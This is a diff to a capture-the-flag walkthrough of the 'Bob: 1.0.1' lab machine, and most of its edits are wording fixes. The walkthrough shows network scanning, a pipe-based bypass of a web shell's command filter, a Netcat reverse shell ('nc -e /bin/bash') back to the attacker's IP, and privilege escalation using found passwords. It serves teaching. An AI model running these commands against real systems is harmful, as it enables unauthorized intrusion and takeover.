@@ -29,7 +29,7 @@ The threat model of this demo is that the attacker (a Kali Linux virtual machine
 
 - [**Discovery**](#discovery) &rightarrow; network scanning and services enumeration
 - [**Initial Access**](#initial-access) &rightarrow; exploit RCE vulnerability on web application
-- [**Execution**](#execution) &rightarrow; spawn target's remote shell on Kali VM using Netcat
+- [**Execution**](#execution) &rightarrow; spawn reverse shell using Netcat
 - [**Credential Access**](#credential-access) &rightarrow; use of legitimate credentials stored insecurely in the machine
 - [**Privilege Escalation**](#privilege-escalation) &rightarrow; abuse of high privileges valid accounts
 
@@ -40,7 +40,7 @@ The initial step involves scanning the local network to find the IP address of t
 ```bash
 netdiscover -r 10.0.2.0/24
 ```
-it invokes a tool based on ARP (Address Resolution Protocol) requests that determines online hosts on the network. Parameter `-r` indicates to the tool the range of IP addresses to scan.
+it invokes a tool based on ARP (Address Resolution Protocol) requests that determines online hosts on the network. Parameter `-r` indicates to the tool the runge of IP addresses to scan.
 
 While the Kali machine has IP address `10.0.2.6`, it is determined that _Bob: 1.0.1_ is at `10.0.2.10`.
 
@@ -51,7 +51,7 @@ nmap -p- -A 10.0.2.10
 ```
 is employed. It takes as input the target IP along with specific parameters (outlined below) and provides in output an accurate enumeration of the servers running on target system. For each service it provides port numbers, protocols and other details corresponding to it.   
 Command options:
-- `-p-` scans all port range on target machine
+- `-p-` scans all port runge on target machine
 - `-A` it enables OS detection, version scanning of services, traceroute, and other advanced detection techniques. Essentially, it gets as much information as possible about the target machine.
 
 The result of `nmap` is shown in the following screenshot.
@@ -62,7 +62,7 @@ Remarkable facts:
 - a web server is active on port 80,
 - there is an SSH server listening on port 25468 
 
-For convenience, _Bob: 1.0.1_'s IP address is added to file `/etc/hosts` on the Kali machine and linked to the name _hackthebob_.
+For convenience,  _Bob: 1.0.1_'s IP address is added to file `/etc/hosts` on the Kali machine and linked to the name _hackthebob_.
 
 Upon initial inspection, navigating to `http://hackthebob/` reveals what appears to be a website under construction for an high school.
 
@@ -73,7 +73,7 @@ Despite browsing through all the available pages, no significant information of 
 ### Initial Access
 Upon closer analysis of `nmap` output detailing the web server, it becomes apparent that it hosts a file named `robots.txt`. Such a file typically contains directives for web crawlers regarding which pages to show or to ignore.
 
-Examining its contents, four entries stand out as disallowed `/login.php`, `/passwords.html`, `/lat_memo.html` and `/dev_shell.php`. Those are interesting names, but further investigation reveals that only `http://hackthebob/dev_shell.php` is worthy: this is a web page featuring a rudimentary shell application named "dev_shell". Users can input commands into the text box and submit them to the server for execution.  suggesting a potential entry point for a possible exploration.
+Examining its contents, four entries stand out as disallowed `/login.php`, `/passwords.html`, `/lat_memo.html` and `/dev_shell.php`. Those are interesting names, but further investigation reveals that only `http://hackthebob/dev_shell.php` is worthy: this is a web page featuring a rudimentary shell application named "dev_shell". Users can input commands into the text box and submit them to the server for execution.
 
 The first action taken is testing some basic bash commands to examine how the server reacts. It appears that there's some internal block or filter in place, because commands such as `ls` or `pwd` display an error message, while the `id` command provides a coherent output.
 
@@ -82,15 +82,14 @@ The following picture shows the web interface of `dev_shell.php` file and the ou
 
 ![3](images/dev.png)
 
-The download of `dev_shell.txt.bak` file with `curl` command, which is likely a backup of `dev_shell.php`, reveals the reason why some commands didn't work. There is a filter consisting in the definition of an array of _bad words_, probably set for preventing mistaken usage. In other words there's a list of potentially dangerous or restricted commands not allowed to users.
-
+The download of `dev_shell.txt.bak` file, which is likely a backup of `dev_shell.php`, reveals the reason why some commands didn't work. There is a filter consisting in the definition of an array of _bad words_, probably set to prevent unauthorized actions. In other words there's a list of potentially dangerous or restricted commands not allowed to users.
 
 ![4](images/blocked.png)
 
-The filter is a very basic and limited security misure and as a matter of fact filter circumvention is possible, as previously demonstrated with the `id | ls` command. It is based on two factors:
-1. In the HTLM file, the PHP code responsible for executing the "security control" is poorly written. The code trims the input command and places it into an array, then executes control check only on the first element of this array, which corresponds to the primary command. 
-2. The operand `|`, called _Pipe_, simply takes as input of the second command the output of the first one, but since `ls` doesn't do anything with its input the result of the concatenated command is just the output of `ls`.  
-(Also other concatenation operators, such as `&`, `&&` and `||` worked as well)
+The filter is a very basic and limited security misure and, as a matter of fact, filter circumvention is possible as previously demonstrated with the `id | ls` command. It is based on two factors:
+1. In the HTLM file, the PHP code responsible for executing the "security control" is poorly written. The code trims the input command and places it into an array, then executes control check only on the first element of this array, which corresponds to the primary command. This is the vulnerability of the web server.
+2. The operund `|`, called _Pipe_, simply takes as input of the second command the output of the first one, but since `ls` doesn't do anything with its input the result of the concatenated command is just the output of `ls`.  
+(Other concatenation operators, such as `&`, `&&` and `||` worked as well)
 
 This means that with a carefully constructed input it is possible to exploit the vulnerability of the web server.
 
@@ -103,7 +102,7 @@ Two steps are involved:
 ```bash
 nc -lvp 6000
 ```
-is ran on Kali side. The machine creates a process listening on port 6000 for connection requests, this will be the server side of the TCP connection.  
+is run on Kali side. The machine creates a process listening on port 6000 for connection requests, this will be the server side of the TCP connection.  
 Command options:
 - `-l` specifies the listen mode, for inbound connections;
 - `v` stands for "verbose", providing additional information about the session state;
@@ -113,7 +112,7 @@ Command options:
 id | nc -e /bin/bash 10.0.2.6 6000
 ```
 
-is ran in the text box of the target web interface. This command bypasses the filter and initiates a TCP connection: the web server will be the client side of the connection.  
+is run in the text box of the target web interface. This command bypasses the filter and initiates a TCP connection: the web server will be the client side of the connection.  
 Command options:
 - `id |` for filter circumvention;
 - `-e /bin/bash` specifies the program to execute after connection, in this case, a Bash shell.
@@ -125,7 +124,7 @@ Although the attempt aims to establish a remote Bash shell on the Kali virtual m
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-This command invokes a Bash shell using command line Python interpreter. 
+This command invokes a Bash shell using the command line Python interpreter. 
 
 The established shell is a reverse shell since the server side is on the attacker's machine, and it is the target side that initiates the connection to the attacker.
 
@@ -139,21 +138,21 @@ All steps from the Netcat connection establishment to this point are shown in th
 
 ![5](images/harpo.png) 
 
-Now it's needed to change account in order to decrypt `login.txt.gpg` bacause the current account `www-data` is not allowed.
+Now it's needed to change account in order to decrypt `login.txt.gpg` because the current account `www-data` is not allowed.
 
 In `/home/elliot` there is a file, `theadminisdumb.txt`, that contains a long text with embedded two user's password. 
-According to this file Elliot's account has password 'theadminisdumb' while the Jc's one has password 'Qwerty'.
+According to this file Elliot's account has password 'theadminisdumb', while the Jc's one has password 'Qwerty' (this second password is out of scope for this demo).
 
 ### Credential Access
-To test this information, the command `su elliot` is ran and, after inserting his password, the current account changes to Elliot's.  
-It turns out that he has permission for decrypting the `.gpg` file, so the following command is ran to attempt it.
+To test this information, the command `su elliot` is run and, after inserting the password, the current account changes to Elliot's.  
+It turns out that he has permission for decrypting the `.gpg` file, so the following command is run to attempt it.
 
 ```bash
 gpg --batch –-passphrase HARPOCRATES -d login.txt.gpg
 ```
 
 Command options:
-- `--batch` runs the command in batch mode, eliminating the need for user input during execution;
+- `--batch` runs the command in batch mode, eliminating the need for user interaction during execution;
 - `–-passphrase HARPOCRATE` specifies the passphrase for decryption;
 - `-d login.txt.gpg` is to specify that decryption is requested on that file.
 
@@ -167,17 +166,17 @@ All the steps mentioned are shown in the following screenshot.
 ### Privilege Escalation
 With the ability to change accounts and impersonate Bob, it's discovered that Bob is a user with root privileges, unlike Elliot.
 
-It is important to notice that Bob is not the owner of the file `flag.txt`, so capturing the flag isn't currently feasible.
+It is important to notice that Bob is not the owner of the file `flag.txt`, so capturing the flag isn't currently feasible.  
 However since Bob is a superuser, by simply executing `sudo su` the root account is obtained: this allow to capture the flag and conclude the challenge.  
 
 ![7](images/root.png)
 
 <div class="horizontal-line"> <br> </div>     
 
-From the output of `nmap` command, is remarkable that there is another server active on the machine: an SSH server running on a non-standard port, 25468.
+From the output of `nmap` command, it's remarkable that there is another server active on the machine: an SSH server running on a non-standard port, 25468.
 This custom port selection may be for security purposes or to obscure its presence.
 
-An SSH connection attempt to Bob: 1.0.1 using Bob's account succeeds with the following command:
+An SSH connection attempt to _Bob: 1.0.1_ using Bob's account succeeds with the following command:
 
 ```bash
 ssh -p 25468 bob@hackthebob
